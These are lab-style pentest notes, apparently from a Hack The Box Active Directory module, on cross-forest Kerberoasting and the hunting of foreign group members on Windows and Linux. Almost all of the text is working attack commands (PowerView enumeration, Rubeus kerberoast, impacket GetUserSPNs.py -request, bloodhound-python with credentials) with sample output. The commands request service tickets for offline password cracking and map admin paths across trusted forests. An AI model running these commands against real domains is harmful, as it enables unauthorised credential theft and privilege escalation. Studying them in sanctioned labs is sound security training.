# Cross-Forest Kerberoasting (Windows ONLY)
```
Import-Module ./Powerview.ps1
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
(Get SNP accounts)
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
(Enumerate the account from previous step)
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
(Kerbeoast on other Forest)


# Hunting DomainForeignGroupMember (Windows ONLY)
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
(Enumerate groups with users that do not belong to the domain, also known as foreign group membership)
```
Convert-SidToName MemberDistinguishedName_SID
```
(Covert MemberDistinguishedName from previous step to Human Text, this will tell you who is part of that group)
```
ex: PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
INLANEFREIGHT\administrator
```
**Explanation:** The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. 


# Cross-Forest Kerberoasting (Linux ONLY)
The principle is the same on the CHILD Domain but we give the PARENT Domain as target instead.
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```
(Here the target-domain points to PARENT but the user is on the CHILD DOMAIN)


# Hunting DomainForeignGroupMember (Linux ONLY)
Add the CHILD Domain DNS to your **/etc/resolv.conf**
```
bloodhound-python -d CHILDDOMAIN -dc DCFQDN -c All -u USER -p PASSWORD
```
(This run the Python version of Sharphound.exe on non-Domain joined hosts and does basically the same.)
Add the PARENT Domains DNS to your **/etc/resolv.conf**
Do same with Bloodhound Python.
